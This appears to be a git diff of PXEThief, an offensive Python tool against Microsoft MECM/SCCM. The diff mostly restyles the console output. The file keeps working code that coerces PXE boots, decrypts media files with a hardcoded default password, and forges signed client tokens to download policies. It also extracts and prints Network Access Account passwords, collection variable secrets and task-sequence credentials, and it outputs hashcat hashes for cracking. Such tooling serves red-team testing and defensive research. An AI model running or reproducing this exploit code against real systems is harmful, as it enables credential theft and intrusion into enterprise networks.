+    warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
+    write_to_binary_file(filename, smsTSMediaPFX)
     auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)
 
     process_pxe_bootable_and_prestaged_media(media_variables)
 
-#Parse the downloaded task sequences and extract sensitive data if present
-def download_and_decrypt_policies_using_certificate(guid,cert_bytes):
-
+def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
     smsMediaGuid = guid
-    #CCMClientID header is equal to smsMediaGuid from the decrypted media file
     CCMClientID = smsMediaGuid
     smsTSMediaPFX = binascii.unhexlify(cert_bytes)
 
-    #Import PFX using cross-platform cryptography library
     pk, cert_obj, chain = pkcs12.load_key_and_certificates(smsTSMediaPFX, smsMediaGuid[:31].encode())
     private_key = pk
-    print('[+] Successfully loaded PFX file!')
+    success("Successfully loaded PFX file!")
 
-    # Auto-convert PFX to PEM for mTLS use
     if cert_obj:
         with open("output.crt", "wb") as f:
             f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
-        print("[+] PEM certificate written to output.crt")
+        success("PEM certificate written to [bold]output.crt[/]")
     if private_key:
         with open("output-key.pem", "wb") as f:
             f.write(private_key.private_bytes(
@@ -668,43 +625,35 @@ def download_and_decrypt_policies_using_certificate(guid,cert_bytes):
                 serialization.PrivateFormat.TraditionalOpenSSL,
                 serialization.NoEncryption()
             ))
-        print("[+] PEM private key written to output-key.pem")
+        success("PEM private key written to [bold]output-key.pem[/]")
 
-    print('[+] Generating Client Authentication headers using PFX File...')
+    info("Generating client authentication headers...")
 
-    data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientIDSignature = generateSignedData(data,private_key)
-    CCMClientIDSignature = str(generateClientTokenSignature(data,private_key))
-    print("[+] CCMClientID Signature Generated")
+    data_bytes = CCMClientID.encode("utf-16-le") + b'\x00\x00'
+    CCMClientIDSignature = str(generateClientTokenSignature(data_bytes, private_key))
+    success("CCMClientID signature generated")
 
     CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat()+'Z'
-    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientTimestampSignature = generateSignedData(data,private_key)
-    CCMClientTimestampSignature = str(generateClientTokenSignature(data,private_key))
-    print("[+] CCMClientTimestamp Signature Generated")
+    data_bytes = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+    CCMClientTimestampSignature = str(generateClientTokenSignature(data_bytes, private_key))
+    success("CCMClientTimestamp signature generated")
 
-    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
-    #clientTokenSignature = str(generateSignedData(data,private_key))
-    clientTokenSignature = str(generateClientTokenSignature(data,private_key))
-
-    print("[+] ClientToken Signature Generated")
+    data_bytes = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+    clientTokenSignature = str(generateClientTokenSignature(data_bytes, private_key))
+    success("ClientToken signature generated")
 
     try:
-        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature)
+        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature)
     except Exception as e:
-        print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm")
-        print()
-        print("Fix network connectivity issues by ensuring you can connect to the HTTP port on the server and fixing DNS issues or by using the SCCM_BASE_URL to hardcode the beginning of the URL used to access the MP: e.g. http://192.168.56.101")
-        print()
-        print("The SHA1 signing algorithm is implemented by generateSignedData and the SHA256 signing algorithm is implemented by generateClientTokenSignature")
-        print("If you encountered errors, for CCMClientIDSignature, CCMClientTimestampSignature and clientTokenSignature change the current signing algorithm to the one not in use")
-        print(e)
+        error("Failed to retrieve policies. Possible causes:")
+        console.print("    [dim]1.[/] Network connectivity — ensure HTTP port is reachable, fix DNS or hardcode [bold]SCCM_BASE_URL[/]")
+        console.print("    [dim]2.[/] Signing algorithm mismatch — try swapping SHA1/SHA256 in generateSignedData/generateClientTokenSignature")
+        error(f"  {e}")
         sys.exit(-1)
 
     for colsetting in colsettings:
-        print("\n[+] Collection Variables found for 'All Unknown Computers' collection!")
+        console.rule("[bold magenta]Collection Variables — All Unknown Computers[/]", style="magenta")
 
-        #Check to see if Collection Variables are encrypted
         is_plaintext = False
         try:
             colsetting.content.decode("utf-16-le")
@@ -731,50 +680,43 @@ def download_and_decrypt_policies_using_certificate(guid,cert_bytes):
             encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text
             collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text
 
-            print("\n[!] Collection Variable Name: '" + collection_var_name +"'")
+            cred("Collection Variable", collection_var_name)
             collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
             collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
-            print("[!] Collection Variable Secret: '" + collection_var_secret + "'")
+            cred("Secret", collection_var_secret)
 
-    print("\n[+] Decrypting Network Access Account Configuration")
+    console.rule("[bold green]Network Access Account Configuration[/]", style="green")
     for naaConfig in naaConfigs:
         if USING_TLS:
             dstr = safe_decode_utf16le(naaConfig.content, "NAA config")
         else:
             dstr = cms_decrypt(private_key, naaConfig.content)
             dstr = safe_decode_utf16le(dstr, "decrypted NAA config")
-
         wf_dstr = "".join(c for c in dstr if c.isprintable())
         process_naa_xml(wf_dstr)
 
-    print()
-    print("[+] Decrypting Task Sequence Configuration\n")
+    console.rule("[bold green]Task Sequence Configuration[/]", style="green")
     for tsConfig in tsConfigs:
-
         if USING_TLS:
             dstr = safe_decode_utf16le(tsConfig.content, "task sequence config")
         else:
             dstr = cms_decrypt(private_key, tsConfig.content)
             dstr = safe_decode_utf16le(dstr, "decrypted task sequence config")
-
         wf_dstr = "".join(c for c in dstr if c.isprintable())
         tsSequence = process_task_sequence_xml(wf_dstr)
 
 def process_naa_xml(naa_xml):
-
-    print("[+] Extracting password from Decrypted Network Access Account Configuration\n")
     root = ET.fromstring(naa_xml)
     network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")
 
     for naa_settings in network_access_account_xml:
-
         network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
         network_access_username = network_access_username[:network_access_username.rfind('\x00')]
-        print("[!] Network Access Account Username: '" + network_access_username + "'")
+        cred("NAA Username", network_access_username)
 
         network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
         network_access_password = network_access_password[:network_access_password.rfind('\x00')]
-        print("[!] Network Access Account Password: '" + network_access_password+"'")
+        cred("NAA Password", network_access_password)
 
 def process_task_sequence_xml(ts_xml):
     root = ET.fromstring(ts_xml)
@@ -787,32 +729,32 @@ def process_task_sequence_xml(ts_xml):
     keepcharacters = (' ','.','_', '-')
     tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()
 
-    #Is TS_Sequence plaintext? This is the case when processing TS from full media and may be the case for TS transmitted over HTTPS?
     if ts_sequence_tag[:9] == "<sequence":
         tsSequence = ts_sequence_tag
     else:
         try:
             tsSequence = deobfuscate_credential_string(ts_sequence_tag)
-            print("[!] Successfully Decrypted TS_Sequence XML Blob in Task Sequence '" + pkg_name + "'!")
+            success(f"Decrypted TS_Sequence in [bold]{pkg_name}[/]")
         except Exception as e:
-            print("Failed to decrypt TS_Sequence in '" + pkg_name + "'. The encryption used on the SCCM server may be different than expected?")
-            print("    Error: " + str(e))
+            error(f"Failed to decrypt TS_Sequence in [bold]{pkg_name}[/]: {e}")
             return
 
     tsSequence = tsSequence[:tsSequence.rfind(">")+1]
     tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()
 
     if DUMP_TS_XML:
-        print("[!] Writing decrypted TaskSequence policy XML to 'TaskSequence_policy_" + tsName + ".xml'.")
-        with open("TaskSequence_policy_" + tsName + ".xml", "w") as f:
+        fname = "TaskSequence_policy_" + tsName + ".xml"
+        warning(f"Writing TaskSequence policy XML to [bold]{fname}[/]")
+        with open(fname, "w") as f:
             f.write(tsSequence)
 
     if DUMP_TS_Sequence_XML:
-        print("[!] Writing decrypted TS_Sequence XML to '" + tsName + ".xml'. This can be manually inspected for credentials")
-        with open(tsName + ".xml", "w") as f:
+        fname = tsName + ".xml"
+        warning(f"Writing TS_Sequence XML to [bold]{fname}[/]")
+        with open(fname, "w") as f:
             f.write(tsSequence)
 
-    print("[+] Attempting to automatically identify credentials in Task Sequence '" + pkg_name + "':\n")
+    info(f"Searching for credentials in [bold]{pkg_name}[/]...")
     analyse_task_sequence_for_potential_creds(tsSequence)
 
 def write_to_file(filename, contents):
@@ -824,64 +766,53 @@ def write_to_binary_file(filename, contents):
         f.write(contents)
 
 def analyse_task_sequence_for_potential_creds(ts_xml):
-    #Known tags: property="DomainPassword" name="OSDJoinPassword", property="DomainUsername" name="OSDJoinAccount", property="AdminPassword" name="OSDLocalAdminPassword", property="RegisteredUserName" name="OSDRegisteredUserName", property="CapturePassword" name="OSDCaptureAccountPassword", property="CaptureUsername" name="OSDCaptureAccount"
     tree = ET.fromstring(ts_xml).getroottree()
 
     keyword_list = ["password", "account", "username"]
     element_search_list = []
 
     for word in keyword_list:
-        # TODO  search through different attributes other than name?
-        element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word +'")]')])
+        element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word + '")]')])
 
     parent_list = []
     creds_found = False
     for word, elements in element_search_list:
         for element in elements:
             if not creds_found:
-                print("[!] Possible credential fields found!\n")
+                found("Credentials found!")
                 creds_found = True
-            parent = element.getparent() # TODO if parent is defaultvarlist
+            parent = element.getparent()
             if parent not in parent_list:
                 parent_list.append(parent)
-                print("In TS Step \"" + parent.getparent().attrib["name"]+"\":")
+                step_name = parent.getparent().attrib["name"]
+                console.print(f"    [dim]TS Step:[/] [bold white]{step_name}[/]")
                 unique_words = [x for x in keyword_list if x != word]
 
                 par = ET.ElementTree(parent)
                 for unique_word in unique_words:
-
                     for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
-                        if el != element: #duplicate tags that match more than one keyword
-                            print(el.attrib["name"] + " - " + el.text)
+                        if el != element:
+                            cred(el.attrib["name"], el.text)
 
-                print(element.attrib["name"] + " - " + str(element.text))
-                print()
+                cred(element.attrib["name"], str(element.text))
 
     if not creds_found:
-        print("[!] No credentials identified in this Task Sequence.\n")
-        #print("[!] Look through it for credentials by searching for tags and properties with the words 'Account', 'Username', 'Password'")
+        info("No credentials identified in this Task Sequence")
 
-#Retrieve all available TSs, the NAA config and any identified collection settings and return to parsing function
-def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature):
-
-    #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
-    #print("[+] Retrieving Needed Metadata from SCCM Server...")
+def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature):
     sccm_base_url = SCCM_BASE_URL
     session = requests.Session()
 
     if USING_TLS:
         session.verify = False
-        session.cert = (CERT_FILE,KEY_FILE)
-        #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
+        session.cert = (CERT_FILE, KEY_FILE)
     if USING_PROXY:
-        proxies = {"https":'127.0.0.1:8080'}
+        proxies = {"https": '127.0.0.1:8080'}
         session.proxies = proxies
 
-    #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
-    print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
+    info("Retrieving x64UnknownMachineGUID from MECM MP...")
     r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
 
-    #Parse XML and retrieve x64UnknownMachineGUID
     root = ET.fromstring(r.text)
     clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
     sitecode = root.find("SITECODE").text
@@ -890,17 +821,15 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
         with open("MPKEYINFORMATIONMEDIA.xml", "w") as f:
             f.write(r.text)
 
-    #Add UTF-16-LE Byte Order Mark (BOM)
-    first_payload = b'\xFF\xFE' + ('<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature +'\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>').encode("utf-16-le")
+    first_payload = b'\xFF\xFE' + ('<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature + '\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>').encode("utf-16-le")
     second_payload = ('<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n').encode("utf-16-le") + b'\x00\x00\x00'
 
     me = MultipartEncoder(fields={'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 'RequestAssignments': second_payload})
-    print("[+] Requesting policy assignments from MP...")
-    r = session.request("CCM_POST",sccm_base_url + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data","mixed")})
+    info("Requesting policy assignments from MP...")
+    r = session.request("CCM_POST", sccm_base_url + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data", "mixed")})
 
     multipart_data = MultipartDecoder.from_response(r)
 
-    #Get the zlib compressed policy locations and parse out the URLs for NAAConfig and TaskSequence
     policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
     wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())
 
@@ -908,9 +837,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
         with open("ReplyAssignments.xml", "w") as f:
             f.write(wf_policy_xml)
 
-    #Pull relevant configs from RequestAssignments XML
     allPoliciesURLs = {}
-
     root = ET.fromstring(wf_policy_xml)
     policyAssignments = root.findall("PolicyAssignment")
     dedup = 0
@@ -919,26 +846,25 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
         policies = policyAssignment.findall("Policy")
         for policy in policies:
             if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
-                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url)
+                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
             else:
                 if policy.get("PolicyCategory") is None:
-                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url)
+                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in r"\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
                 else:
-                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url)
+                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
                     dedup = dedup + 1
 
-    print("[+] " + str(len(allPoliciesURLs)) + " policy assignment URLs found!")
+    success(f"{len(allPoliciesURLs)} policy assignment URLs found!")
 
-    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature" : CCMClientIDSignature, "CCMClientTimestamp" : CCMClientTimestamp, "CCMClientTimestampSignature" : CCMClientTimestampSignature}
+    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature": CCMClientIDSignature, "CCMClientTimestamp": CCMClientTimestamp, "CCMClientTimestampSignature": CCMClientTimestampSignature}
 
     if DUMP_POLICIES:
         POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")
-        #Dump all config XMLs to disk - Uncomment to write to policies/*.xml
         policy_folder = os.getcwd() + "/" + POLICY_FOLDER_PREFIX + "_policies/"
         os.mkdir(policy_folder)
         for category, url in allPoliciesURLs.items():
             if category is not None:
-                print("[+] Requesting " + category + " from: " + url)
+                info(f"Requesting [bold]{category}[/] from: {url}")
                 content = session.get(url, headers=headers)
                 with open(policy_folder + category + ".xml", "wb") as f:
                     f.write(content.content)
@@ -948,24 +874,24 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
     tsconfig = []
     for category, url in allPoliciesURLs.items():
         if "NAAConfig" in category:
-            print("[+] Requesting Network Access Account Configuration from: " + url)
+            info(f"Requesting NAA config from: [dim]{url}[/]")
             naaconfig.append(session.get(url, headers=headers))
         if "TaskSequence" in category:
-            print("[+] Requesting Task Sequence Configuration from: " + url)
+            info(f"Requesting Task Sequence from: [dim]{url}[/]")
             tsconfig.append(session.get(url, headers=headers))
         if "CollectionSettings" in category:
-            print("[+] Requesting Collection Settings from: " + url)
+            info(f"Requesting Collection Settings from: [dim]{url}[/]")
             colsettings.append(session.get(url, headers=headers))
 
-    return naaconfig,tsconfig,colsettings
+    return naaconfig, tsconfig, colsettings
 
 def write_default_config_file():
     config = configparser.ConfigParser(allow_no_value=True)
 
     config['SCAPY SETTINGS'] = {}
-    scapy = config['SCAPY SETTINGS']
-    scapy["AUTOMATIC_INTERFACE_SELECTION_MODE"] = "1" #implemented
-    scapy["MANUAL_INTERFACE_SELECTION_BY_ID"] = ""
+    scapy_cfg = config['SCAPY SETTINGS']
+    scapy_cfg["AUTOMATIC_INTERFACE_SELECTION_MODE"] = "1"
+    scapy_cfg["MANUAL_INTERFACE_SELECTION_BY_ID"] = ""
 
     config['HTTP CONNECTION SETTINGS'] = {}
     http = config['HTTP CONNECTION SETTINGS']
@@ -975,13 +901,12 @@ def write_default_config_file():
     config['GENERAL SETTINGS'] = {}
     general = config['GENERAL SETTINGS']
     general["SCCM_BASE_URL"] = ""
-    general["AUTO_EXPLOIT_BLANK_PASSWORD"] = "1" #implemented
+    general["AUTO_EXPLOIT_BLANK_PASSWORD"] = "1"
 
     with open('settings.ini', 'w') as configfile:
-      config.write(configfile)
+        config.write(configfile)
 
-if __name__ == "__main__":
-    name = r"""
+BANNER = r"""[bold red]
  ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
 |\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
 \ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
@@ -990,82 +915,89 @@ if __name__ == "__main__":
    \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
     \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
           |__|/ \|__|
-"""
-    print(name)
+[/]"""
+
+def print_usage():
+    console.print(BANNER)
+    table = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan", padding=(0, 2))
+    table.add_column("Mode", style="bold yellow", no_wrap=True)
+    table.add_column("Description")
+    table.add_row("1", "Auto-discover PXE server via DHCP and download encrypted media file")
+    table.add_row("2 <IP>", "Target a specific MECM Distribution Point by IP address")
+    table.add_row("3 <file> [password]", "Decrypt media variables file and retrieve secrets from MECM")
+    table.add_row("4 <file> <policy> [password]", "Decrypt media variables and Task Sequence from full media")
+    table.add_row("5 <file>", "Print hashcat hash for offline cracking")
+    table.add_row("6 <guid> <cert-file>", "Retrieve task sequences using DP registry key values")
+    table.add_row("7 <hex-value>", "Decrypt stored PXE password from DP registry key Reserved1")
+    table.add_row("8", "Write default settings.ini")
+    table.add_row("10", "Print Scapy interface table")
+    console.print(table)
+
+if __name__ == "__main__":
 
     if len(sys.argv) < 2 or sys.argv[1] == "-h":
-
-        print("%s 1 - Automatically identify and download encrypted media file using DHCP PXE boot request. Additionally, attempt exploitation of blank media password when auto_exploit_blank_password is set to 1" % sys.argv[0])
-        print("%s 2 <IP Address of DP Server> - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address" % sys.argv[0])
-        print("%s 3 <variables-file-name> <Password-guess> - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP" % sys.argv[0])
-        print("%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
-        print("%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
-        print("%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
-        print("%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\software\microsoft\sms\dp /v Reserved1)" % sys.argv[0])
-        print("%s 8 - Write new default settings.ini file in PXEThief directory" % sys.argv[0])
-        print("%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'" % sys.argv[0])
+        print_usage()
 
     elif int(sys.argv[1]) == 10:
-
+        console.print(BANNER)
         print_interface_table()
 
     elif int(sys.argv[1]) == 1:
-        #Use DHCP to find PXE Server
-        print("[+] Finding and downloading encrypted media variables file from MECM server...")
+        console.print(BANNER)
+        info("Finding and downloading encrypted media variables file...")
         configure_scapy_networking(None)
         get_pxe_files(None)
 
     elif int(sys.argv[1]) == 2:
-        #Try to directly access user specified DP
+        console.print(BANNER)
         if len(sys.argv) != 3:
-            print("Usage:   %s 2 <ip addess of MECM server>" % sys.argv[0])
+            error("Usage: pxethief.py 2 <ip address of MECM server>")
             sys.exit(0)
-
-        print("[+] Generating and downloading encrypted media variables file from MECM server located at " + sys.argv[2])
+        info(f"Targeting MECM server at [bold]{sys.argv[2]}[/]")
         configure_scapy_networking(sys.argv[2])
         get_pxe_files(sys.argv[2])
 
     elif int(sys.argv[1]) == 3:
-        #Decrypt media variables file using password
-        print("[+] Attempting to decrypt media variables file and retrieve policies and passwords from MECM Server...")
+        console.print(BANNER)
+        info("Attempting to decrypt media variables file and retrieve policies...")
 
         if not (len(sys.argv) == 4 or len(sys.argv) == 3):
-            print("Usage:   %s 3 <variables-file-name> <Password-guess>" % sys.argv[0])
+            error("Usage: pxethief.py 3 <variables-file> <password>")
             sys.exit(0)
 
         if len(sys.argv) == 3:
-            print("[+] User did not supply password. Making use of default MECM media variables password (only works for non-password protected media)")
+            info("No password supplied — using default MECM media variables password")
             password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
         else:
             password = sys.argv[3]
 
         path = sys.argv[2]
-        media_variables = decrypt_media_file(path,password)
-        print("[!] Writing media variables to variables.xml")
-        write_to_file("variables",media_variables)
+        media_variables = decrypt_media_file(path, password)
+        warning("Writing media variables to [bold]variables.xml[/]")
+        write_to_file("variables", media_variables)
 
-        #Parse media file in order to pull out PFX password and PFX bytes
         root = ET.fromstring(media_variables.encode("utf-16-le"))
         smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
         smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
         smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
-        filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
+        filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
 
-        print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
-        write_to_binary_file(filename,smsTSMediaPFX)
+        warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
+        write_to_binary_file(filename, smsTSMediaPFX)
         auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)
 
         process_pxe_bootable_and_prestaged_media(media_variables)
 
     elif int(sys.argv[1]) == 4:
-        print("[+] Attempting to decrypt encrypted media variables file and policy from stand-alone media...")
+        console.print(BANNER)
+        info("Attempting to decrypt media variables and policy from stand-alone media...")
 
         if not (len(sys.argv) == 4 or len(sys.argv) == 5):
-            print("Usage:   %s 4 <variables-file-name> <policy-file-path> <password>" % sys.argv[0])
+            error("Usage: pxethief.py 4 <variables-file> <policy-file> <password>")
             sys.exit(0)
 
         if len(sys.argv) == 4:
-            print("[+] User did not supply password. Making use of default MECM media password")
+            info("No password supplied — using default MECM media password")
             password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
         else:
             password = sys.argv[4]
@@ -1074,37 +1006,40 @@ if __name__ == "__main__":
         policy_file = sys.argv[3]
 
         if password == "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}":
-            #If no password is set for Full Media, default password is used for Media Variables and _SMSMediaGuid variable is used for policy password
-            media_variables = decrypt_media_file(path,password)
+            media_variables = decrypt_media_file(path, password)
             root = ET.fromstring(media_variables.encode("utf-16-le"))
             smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
-            process_full_media(smsMediaGuid,policy_file)
+            process_full_media(smsMediaGuid, policy_file)
         else:
-            #If a user supplied password is used, the key derived is used decrypt both Policy.xml and the media variables file
-            #print(decrypt_media_file(path,password))
-            process_full_media(password,policy_file)
+            process_full_media(password, policy_file)
+
     elif int(sys.argv[1]) == 5:
+        console.print(BANNER)
         header = media_crypto.read_media_variable_file_header(sys.argv[2]).hex()
-        print("Hashcat hash (AES-128): $sccm$aes128$" + header)
-        print("Hashcat hash (AES-256): $sccm$aes256$" + header)
+        found(f"Hashcat hash (AES-128): [bold]$sccm$aes128${header}[/]")
+        found(f"Hashcat hash (AES-256): [bold]$sccm$aes256${header}[/]")
 
     elif int(sys.argv[1]) == 6:
-        print("[+] Using MECM PXE Certificate registry key values to retrieve task sequences")
+        console.print(BANNER)
+        info("Using MECM PXE Certificate registry key values to retrieve task sequences")
 
         identity = sys.argv[2]
-        print("identityguid: " + identity)
-        print("Path to file with identitycert value: " + sys.argv[3])
+        data("identityguid", identity)
+        data("identitycert file", sys.argv[3])
 
         with open(sys.argv[3], "r") as f:
             cert = f.read()
 
-        download_and_decrypt_policies_using_certificate(identity,cert)
+        download_and_decrypt_policies_using_certificate(identity, cert)
 
     elif int(sys.argv[1]) == 7:
-        print("[+] Decrypt stored PXE password from SCCM DP registry key Reserved1")
+        console.print(BANNER)
+        info("Decrypting stored PXE password from SCCM DP registry key Reserved1")
         reserved = deobfuscate_credential_string(sys.argv[2])
-        print("PXE Password: " + reserved[:reserved.rfind('\x00')])
+        cred("PXE Password", reserved[:reserved.rfind('\x00')])
 
     elif int(sys.argv[1]) == 8:
-        print("[+] Writing new 'settings.ini' file to PXEThief folder with default values")
+        console.print(BANNER)
+        info("Writing default [bold]settings.ini[/]...")
         write_default_config_file()
+        success("settings.ini written!")
